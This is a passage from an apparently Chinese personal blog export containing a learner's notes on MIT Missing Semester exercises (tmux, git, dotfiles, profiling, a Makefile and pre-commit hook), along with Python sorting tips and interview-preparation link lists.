uniq -c | wc -l</span><br></pre></td></tr></table></figure><p>输出结果：<br>76</p><p>4. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">journalctl | grep Startup | tail -10 | sed -E &#x27;s/^.* ([0-9]+\.[0-9]+)[s]\.$/\1/&#x27; | sort | R --slave -e &#x27;x &lt;- scan(file=&quot;stdin&quot;, quiet=TRUE); summary(x)&#x27;</span><br></pre></td></tr></table></figure><p>5.<br>没太看懂啥意思，略</p><ol start="6"><li>略</li></ol><h2 id="lec-5-exercise"><a href="#lec-5-exercise" class="headerlink" title="lec 5 exercise"></a>lec 5 exercise</h2><p>** Job control **</p><ol><li><p>sleep 1000<br> Ctrl+z 退出当前程序<br> bg 当前程序background运行<br> pgrep sleep 可以得到 sleep 1000 的pid<br> pkill sleep 可以terminate sleep 1000</p><p> 关于pgrep 或pkill -a或-f,参阅man pgrep.</p></li><li><p>pidwait.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pidwait() </span><br><span class="line">&#123;</span><br><span class="line">    while kill -0 $1</span><br><span class="line">    do</span><br><span class="line">    sleep 1</span><br><span class="line">    done</span><br><span class="line">    ls</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source path/to/pidwait.sh</span><br><span class="line">sleep 60 &amp; pidwait $(pgrep sleep 60)</span><br></pre></td></tr></table></figure><p>参考: <a href="https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/command-line-solution/">https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/command-line-solution/</a></p></li></ol><p>** Terminal multiplexer **</p><p>2.<br>Ctrl+b “ : 上下分割窗口（pane)<br>Ctrl+b % : 左右分割窗口<br>Ctrl+b 上下左右 : 去到不同窗口<br>exit &#x2F; Ctrl+d: 关闭窗口</p><p>Ctrl+b c:create new window(就是创建一个新的类似tab一样的东西)<br>Ctrl+b p: go to previous window<br>Ctrl+b n: go to next window<br>Ctrl+b <number>: go to 标号为number的window<br>Ctrl+b d: To detach your current session<br>Ctrl+b D: to have tmux give you a choice which of your sessions you want to detach.</p><p>These two will detach your session but will leave you’re doing in that session running in the background.</p><p>Ctrl+b z: 窗口（pane)全屏， 再一次Ctrl+b z会使窗口变为原来的大小。<br>Ctrl+b：当前窗口重命名</p><p>tmux ls: list all running sessions</p><p>To connect to that session you start tmux again but this time tell it which session to attach to:<br>tmux attach -t 0<br>Note that the -t 0 is the parameter that tells tmux which session to attach to. “0” is the first part of your tmux ls output.</p><p>tmux new -s session_name: create a new session with session_name</p><p>tmux rename-session -t 0 session_name: rename session “0” with session_name</p><p>tmux attach -t session_name</p><p>参考文献：<br><a href="https://www.hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/">https://www.hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/</a><br><a href="https://missing.csail.mit.edu/2020/command-line/">https://missing.csail.mit.edu/2020/command-line/</a></p><p>** Aliases **<br>略</p><p>** Dotfiles **</p><p>1. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/dotfiles</span><br><span class="line">git init ~/dotfiles</span><br></pre></td></tr></table></figure><p>3. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">files=&quot;bashrc vimrc &quot;</span><br><span class="line"></span><br><span class="line">for file in $files; do</span><br><span class="line">   ln -s ~/dotfiles/$file ~/.$file</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>参考：<a href="https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/command-line-solution/">https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/command-line-solution/</a><br><a href="https://ivan-kim.github.io/MIT-missing-semester/Lecture5/">https://ivan-kim.github.io/MIT-missing-semester/Lecture5/</a></p><ol start="4"><li>从第4开始之后没做，我ssh好像有点问题</li></ol><p>** Remote Machines **<br>3. 不知道为啥总是connection timed out.</p><h2 id="Lec-6-exercise"><a href="#Lec-6-exercise" class="headerlink" title="Lec 6 exercise"></a>Lec 6 exercise</h2><ol start="2"><li><p>git clone <a href="https://github.com/missing-semester/missing-semester.git">https://github.com/missing-semester/missing-semester.git</a><br> git log –all –graph –decorate<br> git log -p <file_path></p></li><li><p>git blame _config.yml<br>然后可以看到collections对应的哈希值是a88b4eac</p><p>然后git show a88b4eac，可以查看这次commit的详细信息。</p></li><li><p>已做，答案略</p></li><li><p>在.git&#x2F;config里加上：<br>[alias]<br> graph &#x3D; log –all –graph –decorate –oneline</p></li><li><p>在~&#x2F;下创建gitignore_global文件，在文件中添加<br>.DS_Store<br>.vscode<br>等需要忽略的文件<br>然后执行 git config –global core.excludesfile ~&#x2F;.gitignore_global<br>上述是global的例子，也可改为只作用于当先repo.</p></li><li><p>略</p></li></ol><h2 id="Lec-7-Exercise"><a href="#Lec-7-Exercise" class="headerlink" title="Lec 7 Exercise"></a>Lec 7 Exercise</h2><p>Debugging</p><ol><li>journalctl我执行有问题，待解决。</li></ol><p>其他的题目没做，我暂时不需要这些，IDE基本都有这些功能。</p><p>Profiling<br>5. kernprof -l -v sorts.py (注意：要在要measure的函数的上一行添加@profile)<br>python3 -m cProfile -s tottime sorts.py | grep insertionsort<br>python3 -m cProfile -s tottime sorts.py | grep quicksort</p><p>bottleneck: 看kernprof -l -v sorts.py 的结果的表格里的%time。</p><p>python3 -m memory_profiler sorts.py</p><ol start="6"><li><p>pycallgraph graphviz – .&#x2F;fib.py<br>fib0 is called 21 times. Yes. One time.</p></li><li><p>略</p></li><li><p>当执行stress -c 3时，htop显示有三个cpu被全部占用。<br>当执行taskset –cpu-list 0,2 stress -c 3时，htop显示1号和3号cpu被全部占用。这是由于taskset –cpu-list 0,2将stress这个任务安排在0和2号cpu上。htop里cpu编号是从1开始的，所以显示1，3号cpu被全部占用。</p></li><li><p>略</p></li></ol><h2 id="Lec-8-Exercise"><a href="#Lec-8-Exercise" class="headerlink" title="Lec 8 Exercise"></a>Lec 8 Exercise</h2><p>1.<br>makefile 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">paper.pdf: paper.tex plot-data.png</span><br><span class="line">pdflatex paper.tex</span><br><span class="line"></span><br><span class="line">plot-%.png: %.dat plot.py</span><br><span class="line">./plot.py -i $*.dat -o $@</span><br><span class="line"></span><br><span class="line">.PHONY: clean</span><br><span class="line">clean:</span><br><span class="line">rm plot*.png paper.pdf</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可参考 <a href="https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/metaprogramming-solution/">https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/metaprogramming-solution/</a></p><ol start="2"><li><p>略</p></li><li></li></ol><p>在.git&#x2F;hooks&#x2F;下：touch pre-commit<br>pre-commit内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if  ! make ; then</span><br><span class="line">     echo &quot;build failed, commit rejected&quot;</span><br><span class="line">     exit 1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>For the purposes of testing, chmod -x plot.py to make it unexecutable and yield an error purposefully. It shows the pre-commit hook successfully prevents any commit from having an unbuildable version of the paper.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -m &#x27;failure test&#x27;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://ivan-kim.github.io/MIT-missing-semester/Lecture8/">https://ivan-kim.github.io/MIT-missing-semester/Lecture8/</a><br><a href="https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/metaprogramming-solution/">https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/metaprogramming-solution/</a></p><ol start="4"><li><p>略</p></li><li><p>略</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 公开课, tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自学，公开课 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/05/18/dimensionality-reduction-fang-fa/"/>
      <url>/2022/05/18/dimensionality-reduction-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>dimensionality reduction 方法<br><a href="https://chenrudan.github.io/blog/2016/04/01/dimensionalityreduction.html">https://chenrudan.github.io/blog/2016/04/01/dimensionalityreduction.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一些总是记不住的python语法</title>
      <link href="/2022/05/15/yi-xie-zong-shi-ji-bu-zhu-de-python-yu-fa/"/>
      <url>/2022/05/15/yi-xie-zong-shi-ji-bu-zhu-de-python-yu-fa/</url>
      
        <content type="html"><![CDATA[<p>一些总是记不住的python语法</p><p>将多个list zip起来，并且按照一个list的元素把所有list排序。<br>e.g. </p><p>list1 &#x3D; [“c”, “b”, “d”, “a”]<br>list2 &#x3D; [2, 3, 1, 4]</p><p>排序过后的结果：<br>[‘a’, ‘b’, ‘c’, ‘d’]<br>[4, 3, 2, 1]</p><p>程序如下：<br>list1 &#x3D; [“c”, “b”, “d”, “a”]<br>list2 &#x3D; [2, 3, 1, 4]</p><p>zipped_lists &#x3D; zip(list1, list2) #注意：按谁排序谁作为zip()的第一个参数！<br>sorted_pairs &#x3D; sorted(zipped_lists)</p><p>tuples &#x3D; zip(*sorted_pairs)<br>list1, list2 &#x3D; [ list(tuple) for tuple in  tuples]</p><p>print(list1)<br>OUTPUT<br>[‘a’, ‘b’, ‘c’, ‘d’]<br>print(list2)<br>OUTPUT<br>[4, 3, 2, 1]</p><p>zip(<em>) zip中</em>的用法相当与unpack.<br>来源：<br><a href="https://www.adamsmith.haus/python/answers/how-to-sort-two-lists-together-in-python">https://www.adamsmith.haus/python/answers/how-to-sort-two-lists-together-in-python</a><br><a href="https://stackoverflow.com/questions/9764298/how-to-sort-two-lists-which-reference-each-other-in-the-exact-same-way">https://stackoverflow.com/questions/9764298/how-to-sort-two-lists-which-reference-each-other-in-the-exact-same-way</a></p><p>sort dictionay by key in python:<br>sorted_dict &#x3D; dict(sorted(unsorted_dict.items()))<br>来源（高赞下的评论）：<br><a href="https://stackoverflow.com/questions/9001509/how-can-i-sort-a-dictionary-by-key">https://stackoverflow.com/questions/9001509/how-can-i-sort-a-dictionary-by-key</a></p><p>sort dictionay by value in python（我觉得第二种更好）:</p><blockquote><blockquote><blockquote><p>x &#x3D; {1: 2, 3: 4, 4: 3, 2: 1, 0: 0}<br>{k: v for k, v in sorted(x.items(), key&#x3D;lambda item: item[1])}<br>{0: 0, 2: 1, 1: 2, 4: 3, 3: 4}</p></blockquote></blockquote></blockquote><p>or</p><blockquote><blockquote><blockquote><p>dict(sorted(x.items(), key&#x3D;lambda item: item[1]))<br>{0: 0, 2: 1, 1: 2, 4: 3, 3: 4}</p></blockquote></blockquote></blockquote><p>来源：<br><a href="https://stackoverflow.com/questions/613183/how-do-i-sort-a-dictionary-by-value">https://stackoverflow.com/questions/613183/how-do-i-sort-a-dictionary-by-value</a></p><p>python list of tuples 按照多个条件排序：<br>对tuple进行排序，先按照第一个元素升序，如果第一个元素相同，再按照第二个元素降序排列。</p><p>L &#x3D; [(12,12),(34,13),(32,15),(12,24),(32,64),(32,11)]<br>L.sort(key&#x3D;lambda x: (x[0], -x[1]))<br>print(L)<br>[(12, 24), (12, 12), (32, 64), (32, 15), (32, 11), (34, 13)]</p><p>如果想先按第二个元素升序再按第一个元素升序：<br>L1 &#x3D; sorted(L, key&#x3D;lambda x: (x[1], x[0]))<br>来源：<br><a href="https://blog.csdn.net/y12345678904/article/details/77507552">https://blog.csdn.net/y12345678904/article/details/77507552</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程语言, Python, 语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/05/12/mian-shi-zhong-yu-dao-de-suan-fa-ti/"/>
      <url>/2022/05/12/mian-shi-zhong-yu-dao-de-suan-fa-ti/</url>
      
        <content type="html"><![CDATA[<p>leetcode 114<br>leetcode 1110</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/05/12/kan-bie-ren-mian-jing-tie-li-de-suan-fa-ti/"/>
      <url>/2022/05/12/kan-bie-ren-mian-jing-tie-li-de-suan-fa-ti/</url>
      
        <content type="html"><![CDATA[<p>看别人面经贴里的算法题</p><p>Disney+hotstar<br>leetcode 136<br>最简单的方法是用异或操作。</p><p>follow up: 找出数组中只出现一次的两个数，其他数都出现两次<br><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/solution/jian-zhi-offer-56-i-shu-zu-zhong-shu-zi-tykom/">https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/solution/jian-zhi-offer-56-i-shu-zu-zhong-shu-zi-tykom/</a></p><p>该算法里有点难理解的地方，解释如下：<br>m 标记了x, y 从低位到高位（从右到左）第一位不同的比特。（x，y在该比特一个为1，一个为0）.<br>遍历整个数组，数组里的每个数和m 做与运算，该比特为1的被分为一组，该比特为0的被分为一组，所以这样就保证了x,y被分为两个不同的组。</p><p>leetcode 958</p><p>Lintcode 437 <a href="https://www.lintcode.com/problem/437/">https://www.lintcode.com/problem/437/</a> (和leetcode 410相同)<br>与该题类似的一道题：<br>给你一个数组，找出K-1个数，使得删去这K-1个数之后得到的K个子数组和相等。（前缀和数组）</p><p>微软</p><p><a href="https://mp.weixin.qq.com/s/yewlHvHSilMsrUMFIO8WAA">https://mp.weixin.qq.com/s/yewlHvHSilMsrUMFIO8WAA</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hulu 面经</title>
      <link href="/2022/05/08/hulu-mian-jing/"/>
      <url>/2022/05/08/hulu-mian-jing/</url>
      
        <content type="html"><![CDATA[<p>hulu 面经<br>给定二叉树的前序和中序遍历，递归地反转二叉树的左右子树，输出反转后的二叉树的前序遍历。</p><p>hulu 整理的别人的面经<br><a href="https://blog.csdn.net/smileiam/article/details/88732245">https://blog.csdn.net/smileiam/article/details/88732245</a></p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>graph traversal BFS/DFS 颜色标记</title>
      <link href="/2022/04/26/dfs-bfs/"/>
      <url>/2022/04/26/dfs-bfs/</url>
      
        <content type="html"><![CDATA[<p>graph traversal（graph DFS&#x2F;BFS） 的时候才会用到3种颜色标记。这样可以detect circle. 树或者矩阵或者其他什么的DFS&#x2F;BFS似乎不用3种颜色标记。（tricolor algorithm）<br><a href="https://www.geeksforgeeks.org/detect-cycle-direct-graph-using-colors/">https://www.geeksforgeeks.org/detect-cycle-direct-graph-using-colors/</a><br><a href="https://www.cs.cornell.edu/courses/cs2112/2012sp/lectures/lec24/lec24-12sp.html">https://www.cs.cornell.edu/courses/cs2112/2012sp/lectures/lec24/lec24-12sp.html</a></p><p>判断一个图是否有环及相关LeetCode题目<br><a href="https://www.jianshu.com/p/acbd585f5c60">https://www.jianshu.com/p/acbd585f5c60</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PG面试</title>
      <link href="/2022/04/26/ping-guo-ml-data-engineer-mian-jing/"/>
      <url>/2022/04/26/ping-guo-ml-data-engineer-mian-jing/</url>
      
        <content type="html"><![CDATA[<p>PG ML&#x2F;data engineer 面经</p><p>LSTM 与RNN的区别？<br>为什么LSTM能缓解weight decay？从激活函数的角度回答<br><a href="https://www.zhihu.com/question/34878706">https://www.zhihu.com/question/34878706</a></p><p>回归评价指标都有哪些？<br>MSE, R^2</p><p>数据不平衡用什么loss?<br>虽然面试官说应该用precision&#x2F;recall做loss，我对此持怀疑态度。<br><a href="https://zhuanlan.zhihu.com/p/260407405">https://zhuanlan.zhihu.com/p/260407405</a></p><p><a href="https://congchan.github.io/%E5%9C%A8loss%E5%B1%82%E9%9D%A2%E9%92%88%E5%AF%B9%E6%A0%B7%E6%9C%AC%E4%B8%8D%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98%E7%9A%84%E4%BC%98%E5%8C%96/">https://congchan.github.io/%E5%9C%A8loss%E5%B1%82%E9%9D%A2%E9%92%88%E5%AF%B9%E6%A0%B7%E6%9C%AC%E4%B8%8D%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98%E7%9A%84%E4%BC%98%E5%8C%96/</a></p><p><a href="https://aijishu.com/a/1060000000197303">https://aijishu.com/a/1060000000197303</a></p><p>随机森林， GBDT</p><p>map reduce</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八股文整理</title>
      <link href="/2022/04/26/ba-gu-wen-zheng-li/"/>
      <url>/2022/04/26/ba-gu-wen-zheng-li/</url>
      
        <content type="html"><![CDATA[<p>八股文整理</p><p>机器学习：</p><p>高频ML&#x2F;DL面试题<br><a href="https://blog.csdn.net/qq_35812205/article/details/117047412">https://blog.csdn.net/qq_35812205/article/details/117047412</a></p><p>Adam and SGD<br><a href="https://blog.csdn.net/jiachen0212/article/details/80086926">https://blog.csdn.net/jiachen0212/article/details/80086926</a></p><p>激活函数性质<br><a href="https://blog.csdn.net/qq_18310041/article/details/91042085">https://blog.csdn.net/qq_18310041/article/details/91042085</a></p><p>激活函数总结：<br><a href="https://www.jiqizhixin.com/articles/2021-02-24-7">https://www.jiqizhixin.com/articles/2021-02-24-7</a></p><p>sigmoid 激活函数梯度消失问题：<br><a href="https://blog.csdn.net/feizxiang3/article/details/101294382#:~:text=%E5%A6%82%E6%9E%9C%E6%98%AF%E5%8F%AA%E6%9C%89%E5%87%A0%E4%B8%AA,%E8%AE%A1%E7%AE%97%E5%88%9D%E5%A7%8B%E5%B1%82%E7%9A%84%E5%AF%BC%E6%95%B0%E3%80%82">https://blog.csdn.net/feizxiang3/article/details/101294382#:~:text=%E5%A6%82%E6%9E%9C%E6%98%AF%E5%8F%AA%E6%9C%89%E5%87%A0%E4%B8%AA,%E8%AE%A1%E7%AE%97%E5%88%9D%E5%A7%8B%E5%B1%82%E7%9A%84%E5%AF%BC%E6%95%B0%E3%80%82</a></p><p>GRU<br><a href="https://towardsdatascience.com/understanding-gru-networks-2ef37df6c9be">https://towardsdatascience.com/understanding-gru-networks-2ef37df6c9be</a></p><p>Activation function<br>Sigmoid vs softmax:<br>Sigmoid&#x2F; logistic function: two class classification<br>Softmax: multiclass classification,当two class 的时候，softmax 就是 sigmoid。 </p><p>交叉熵 cross entropy 解释<br><a href="https://blog.csdn.net/tsyccnh/article/details/79163834#:~:text=%E4%BA%A4%E5%8F%89%E7%86%B5%EF%BC%88cross%20entropy%EF%BC%89%E6%98%AF,%E7%90%86%E8%A7%A3%E6%9C%89%E4%BA%9B%E6%A8%A1%E7%B3%8A%EF%BC%8C%E4%B8%8D%E5%A4%9F%E6%B7%B1%E5%85%A5%E3%80%82">https://blog.csdn.net/tsyccnh/article/details/79163834#:~:text=%E4%BA%A4%E5%8F%89%E7%86%B5%EF%BC%88cross%20entropy%EF%BC%89%E6%98%AF,%E7%90%86%E8%A7%A3%E6%9C%89%E4%BA%9B%E6%A8%A1%E7%B3%8A%EF%BC%8C%E4%B8%8D%E5%A4%9F%E6%B7%B1%E5%85%A5%E3%80%82</a></p><p>Bidirectional RNN<br><a href="https://towardsdatascience.com/understanding-bidirectional-rnn-in-pytorch-5bd25a5dd66">https://towardsdatascience.com/understanding-bidirectional-rnn-in-pytorch-5bd25a5dd66</a></p><p>loss functon 总结:</p><p><a href="https://zhuanlan.zhihu.com/p/58883095">https://zhuanlan.zhihu.com/p/58883095</a></p><p><a href="https://demmon-tju.github.io/2020/01/28/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/">https://demmon-tju.github.io/2020/01/28/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/</a></p><p>GBDT<br><a href="https://www.cnblogs.com/pinard/p/6140514.html#!comments">https://www.cnblogs.com/pinard/p/6140514.html#!comments</a></p><p>XGBOOST<br><a href="https://zhuanlan.zhihu.com/p/142413825">https://zhuanlan.zhihu.com/p/142413825</a><br><a href="https://zhuanlan.zhihu.com/p/87885678">https://zhuanlan.zhihu.com/p/87885678</a></p><p>GBDT XGboost面试题<br><a href="https://zhuanlan.zhihu.com/p/142817461">https://zhuanlan.zhihu.com/p/142817461</a></p><p>样本不平衡问题的处理：</p><ol><li>采样</li><li>移动阈值</li><li>调整不同类别的权重<br><a href="https://cloud.tencent.com/developer/article/1689107">https://cloud.tencent.com/developer/article/1689107</a></li></ol><p>其他：</p><p>C语言学习 作用域和生存期<br><a href="https://www.jianshu.com/p/fe2782e04401">https://www.jianshu.com/p/fe2782e04401</a></p><p>Java python 的区别<br><a href="http://bookshadow.com/weblog/2014/05/17/python-vs-java-key-differences/">http://bookshadow.com/weblog/2014/05/17/python-vs-java-key-differences/</a></p><p>Wait和sleep的区别<br><a href="https://www.jianshu.com/p/25e959037eed">https://www.jianshu.com/p/25e959037eed</a></p><p>聊聊B树和B+树 数据结构是什么  查询复杂度是多少<br><a href="https://www.cnblogs.com/nullzx/p/8729425.html#:~:text=B%E6%A0%91%E4%B9%9F%E7%A7%B0B,%E7%9A%84%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E3%80%82">https://www.cnblogs.com/nullzx/p/8729425.html#:~:text=B%E6%A0%91%E4%B9%9F%E7%A7%B0B,%E7%9A%84%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E3%80%82</a></p><p>乐观锁 悲观锁<br><a href="https://www.cnblogs.com/kismetv/p/10787228.html">https://www.cnblogs.com/kismetv/p/10787228.html</a></p><p>计算机网络：<br>Cookie, session<br><a href="https://www.zhihu.com/question/19786827">https://www.zhihu.com/question/19786827</a></p><p>客户端发送网络请求，到拿到响应的整个过程：<br><a href="https://blog.csdn.net/zjkC050818/article/details/78345819">https://blog.csdn.net/zjkC050818/article/details/78345819</a></p><p>Http和https的区别， https的原理：<br><a href="https://blog.csdn.net/xionghuixionghui/article/details/68569282#:~:text=HTTPS%E5%92%8CHTTP%E7%9A%84%E5%8C%BA%E5%88%AB,80%EF%BC%8C%E5%90%8E%E8%80%85%E6%98%AF443%E3%80%82">https://blog.csdn.net/xionghuixionghui/article/details/68569282#:~:text=HTTPS%E5%92%8CHTTP%E7%9A%84%E5%8C%BA%E5%88%AB,80%EF%BC%8C%E5%90%8E%E8%80%85%E6%98%AF443%E3%80%82</a></p><p>七层模型 四层模型<br><a href="https://blog.csdn.net/qq_39521554/article/details/79894501">https://blog.csdn.net/qq_39521554/article/details/79894501</a></p><p>流量控制 拥塞控制<br><a href="https://zhuanlan.zhihu.com/p/37379780">https://zhuanlan.zhihu.com/p/37379780</a></p><p>三次握手 四次挥手<br><a href="https://hit-alibaba.github.io/interview/basic/network/TCP.html">https://hit-alibaba.github.io/interview/basic/network/TCP.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516">https://zhuanlan.zhihu.com/p/53374516</a></p><p>TCP与UDP区别总结：<br>1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接<br>2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保   证可靠交付<br>3、TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的<br>  UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）<br>4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信<br>5、TCP首部开销20字节;UDP的首部开销小，只有8个字节<br>6、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道<br>————————————————<br>版权声明：本文为CSDN博主「Li_Ning_」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Li_Ning_/article/details/52117463">https://blog.csdn.net/Li_Ning_/article/details/52117463</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 八股文， 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分查找边界问题</title>
      <link href="/2022/03/21/er-fen-cha-zhao-bian-jie-wen-ti/"/>
      <url>/2022/03/21/er-fen-cha-zhao-bian-jie-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>二分查找边界问题<br><a href="https://leetcode-cn.com/problems/binary-search/solution/er-fen-cha-zhao-de-xun-huan-bu-bian-liang-zhi-yao-/">https://leetcode-cn.com/problems/binary-search/solution/er-fen-cha-zhao-de-xun-huan-bu-bian-liang-zhi-yao-/</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>亚马逊中国面经收集</title>
      <link href="/2022/03/20/ya-ma-xun-zhong-guo-mian-jing-shou-ji/"/>
      <url>/2022/03/20/ya-ma-xun-zhong-guo-mian-jing-shou-ji/</url>
      
        <content type="html"><![CDATA[<p>亚马逊中国面经收集</p><p><a href="https://www.nowcoder.com/discuss/860722?type=2&amp;order=0&amp;pos=6&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632615861&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707">https://www.nowcoder.com/discuss/860722?type=2&amp;order=0&amp;pos=6&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632615861&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707</a></p><p><a href="https://www.nowcoder.com/discuss/863848?type=2&amp;order=0&amp;pos=2&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=b13ed9104b934ec9a874ee860c98af29.800.16477943813400936&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647794381045">https://www.nowcoder.com/discuss/863848?type=2&amp;order=0&amp;pos=2&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=b13ed9104b934ec9a874ee860c98af29.800.16477943813400936&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647794381045</a></p><p><a href="https://www.nowcoder.com/discuss/840469?type=2&amp;order=0&amp;pos=12&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632955867&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707">https://www.nowcoder.com/discuss/840469?type=2&amp;order=0&amp;pos=12&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632955867&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707</a></p><p><a href="https://www.nowcoder.com/discuss/860524?type=2&amp;order=0&amp;pos=4&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632515859&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707">https://www.nowcoder.com/discuss/860524?type=2&amp;order=0&amp;pos=4&amp;page=1&amp;source_id=discuss_tag_nctrack&amp;channel=-1&amp;ncTraceId=97a9ae9d1f344b2cb80c7f2f68231c35.413.16477253632515859&amp;gio_id=469430F67CD5F83DEAA684FF5DF8D82F-1647725363707</a></p><p><a 